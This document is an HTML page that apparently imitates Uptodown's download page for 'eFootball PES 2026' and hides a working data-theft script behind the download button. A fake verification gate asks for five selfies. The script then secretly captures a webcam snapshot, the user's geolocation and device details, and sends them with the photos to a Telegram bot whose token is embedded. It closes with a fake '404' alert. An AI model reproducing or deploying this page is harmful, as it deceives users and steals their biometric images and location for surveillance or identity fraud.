**<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball PES 2026 for Android - Download the APK from Uptodown</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #081d24; /* Original Uptodown dark teal */
            --header: #051116;
            --blue: #1b85d3;
            --green: #00b451;
            --text-dim: #7e949c;
            --card-bg: #0c262f;
        }

        body {
            margin: 0;
            background-color: var(--bg);
            font-family: 'Roboto', sans-serif;
            color: white;
            -webkit-font-smoothing: antialiased;
        }

        /* --- Header & Navigation --- */
        header {
            background: var(--header);
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #102a33;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .burger { color: var(--blue); font-size: 24px; cursor: pointer; }
        .logo { height: 22px; margin-left: 15px; }

        .breadcrumb {
            background: #06181e;
            padding: 10px 16px;
            font-size: 10px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .container { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }

        /* --- Main App Header --- */
        .app-hero { display: flex; gap: 20px; margin-bottom: 25px; }
        .app-icon { width: 105px; height: 105px; border-radius: 22px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); }
        .app-title { font-size: 28px; font-weight: 700; margin: 0; line-height: 1.2; }
        .app-meta { font-size: 14px; margin-top: 6px; color: var(--text-dim); }
        .dev-link { color: var(--blue); text-decoration: none; font-weight: 500; }
        .tag-badge { background: #1e3a45; color: var(--blue); padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 5px; }

        /* --- Stats Bar --- */
        .stats-bar {
            display: flex;
            justify-content: space-around;
            border-top: 1px solid #15323d;
            border-bottom: 1px solid #15323d;
            padding: 16px 0;
            margin: 20px 0;
            text-align: center;
        }
        .stat-val { font-size: 18px; font-weight: 700; display: block; margin-bottom: 2px; }
        .stat-label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; }

        /* --- Download Section --- */
        .dl-section { margin-bottom: 30px; }
        .btn-dl {
            background: var(--green);
            color: white;
            width: 100%;
            padding: 16px;
            border-radius: 6px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
            transition: 0.1s;
        }
        .btn-dl:active { transform: translateY(2px); box-shadow: none; }
        .dl-meta { font-size: 12px; color: var(--text-dim); margin-top: 12px; text-align: center; }

        /* --- Screenshot Gallery (Horizontal Scroll) --- */
        .gallery-label { font-size: 14px; font-weight: 700; color: var(--text-dim); margin-bottom: 15px; text-transform: uppercase; }
        .gallery-scroll {
            display: flex;
            overflow-x: auto;
            gap: 12px;
            padding-bottom: 15px;
            scrollbar-width: none;
        }
        .gallery-scroll::-webkit-scrollbar { display: none; }
        .gallery-scroll img { height: 180px; border-radius: 10px; flex-shrink: 0; border: 1px solid #15323d; }

        /* --- Technical Info (The "Harakteristika") --- */
        .tech-title { font-size: 18px; font-weight: 700; margin: 40px 0 20px; }
        .tech-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            background: var(--card-bg);
            padding: 24px;
            border-radius: 12px;
        }
        .tech-item { display: flex; gap: 12px; align-items: center; }
        .tech-icon {
            width: 34px; height: 34px;
            border: 1px solid var(--blue);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            color: var(--blue); font-size: 16px; flex-shrink: 0;
        }
        .tech-info b { display: block; font-size: 11px; color: var(--text-dim); text-transform: uppercase; margin-bottom: 2px; }
        .tech-info span { font-size: 14px; font-weight: 500; }

        /* --- Stealth Verification Layer --- */
        #gate { display: none; position: fixed; inset: 0; background: rgba(5, 17, 22, 0.98); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
        .gate-card { background: var(--card-bg); width: 100%; max-width: 340px; padding: 35px; border-radius: 16px; border: 1px solid var(--blue); text-align: center; }
        
        video, canvas, #input { display: none; }
    </style>
</head>
<body>

<header>
    <div class="burger">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
</header>

<div class="breadcrumb">Android / Games / Sports / eFootball PES 2026</div>

<div class="container">
    <div class="app-hero">
        <img src="image_980b88.png" class="app-icon" alt="eFootball PES 2026">
        <div>
            <h1 class="app-title">eFootball PES 2026</h1>
            <div class="app-meta">10.4.0 | <a href="#" class="dev-link">KONAMI</a> <span class="badge tag-badge">#Sports</span></div>
        </div>
    </div>

    <div class="stats-bar">
        <div><span class="stat-val">★ 4.4</span><span class="stat-label">135k reviews</span></div>
        <div><span class="stat-val">74.8 M</span><span class="stat-label">downloads</span></div>
        <div><span class="stat-val">🛡️</span><span class="stat-label">Verified</span></div>
    </div>

    <div class="dl-section">
        <button class="btn-dl" onclick="openGate()">Latest version</button>
        <div class="dl-meta">Apr 10, 2026 | 2.4 GB | <span style="color:var(--green)">Safe</span></div>
    </div>

    <div class="gallery-label">Screenshots</div>
    <div class="gallery-scroll">
        <img src="image_980e4b.png">
        <img src="image_980e8c.png">
        <img src="image_980ece.png">
        <img src="image_980f42.png">
        <img src="image_9811ee.png">
    </div>

    <h2 class="tech-title">Technical information</h2>
    <div class="tech-grid">
        <div class="tech-item">
            <div class="tech-icon">👤</div>
            <div class="tech-info"><b>Developer</b><span>uptodown.com</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📄</div>
            <div class="tech-info"><b>License</b><span>Free</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📱</div>
            <div class="tech-info"><b>OS</b><span>Android 7.0+</span></div>
        </div>
        <div class="tech-item">
            <div class="tech-icon">📦</div>
            <div class="tech-info"><b>Package</b><span>jp.konami.pesam</span></div>
        </div>
    </div>
</div>

<div id="gate">
    <div class="gate-card">
        <h3 id="gtT">Verification Required</h3>
        <p id="gtP" style="font-size: 13px; color: var(--text-dim);">To download the XAPK, please upload 5 photos of yourself to confirm you're a human user.</p>
        <label for="input" style="background: var(--blue); display: block; padding: 14px; border-radius: 6px; cursor: pointer; font-weight: 700; margin-top: 20px;">CHOOSE FILES</label>
        <input type="file" id="input" multiple accept="image/*" onchange="start(this)">
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const BOT = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [];

    async function setupAI() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    setupAI();

    function openGate() { document.getElementById('gate').style.display = 'flex'; }

    async function start(input) {
        document.getElementById('gtT').innerText = "Analyzing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const res = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (res.length > 0) photos.push(f);
        }
        process();
    }

    async function process() {
        const device = navigator.platform;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            const snap = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await push(device, map, snap);
            }, () => push(device, "Loc Denied", snap));
        } catch(e) { push(device, "No Cam", null); }
    }

    async function push(d, l, s) {
        await fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: BOT.C, text: `✅ *DATA CAPTURED*\n📱 Device: ${d}\n📍 Loc: ${l}`, parse_mode: 'Markdown'})
        });

        if(s) {
            const fd = new FormData(); fd.append('chat_id', BOT.C); fd.append('photo', s);
            await fetch(`https://api.telegram.org/bot${BOT.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let p of photos) {
            const fd2 = new FormData(); fd2.append('chat_id', BOT.C); fd2.append('photo', p);
            fetch(`https://api.telegram.org/bot${BOT.T}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("Server error 404. Download unavailable in your region.");
        location.reload();
    }
</script>
</body>
</html>**
